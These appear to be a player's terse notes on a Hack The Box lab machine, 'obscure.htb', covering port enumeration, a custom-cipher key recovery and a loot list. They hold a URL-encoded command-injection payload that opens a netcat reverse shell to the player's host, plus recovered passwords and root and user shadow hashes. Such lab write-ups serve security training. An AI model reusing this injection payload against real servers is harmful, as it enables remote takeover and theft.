# Enumeration
- Proxy Server running BadHTTPServer on 8080
- Web server running on 80 doesn't respond to my ip
- 9000 cslistener running doesn't respond to my ip
- obscure.htb
- secure@obscure.htb
# Exploited
- Initial foothold
`http://obscure.htb:8080/%27%3Bos.system%28%27rm%20%2Ftmp%2Fnaiame%3B%20mkfifo%20%2Ftmp%2Fnaiame%3B%20cat%20%2Ftmp%2Fnaiame%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.36%201337%20%3E%2Ftmp%2Fnaiame%27%29%3Babc%3D%27`
- User pawn
`
python3 SuperSecureCrypt.py -i out.txt -o /tmp/naiame.file -k "$(cat check.txt)"
the out.txt is the cipher of check.txt and from the source code -d option will provide key writing to file and out file contains the key
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
from this key is "alexandrovich"
now extracting the user password is the passwordreminder.txt file
SecThruObsFTW is robert password

`
# LOOT
robert:SecThruObsFTW
root:mercedes

SHADOW FILE:

root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
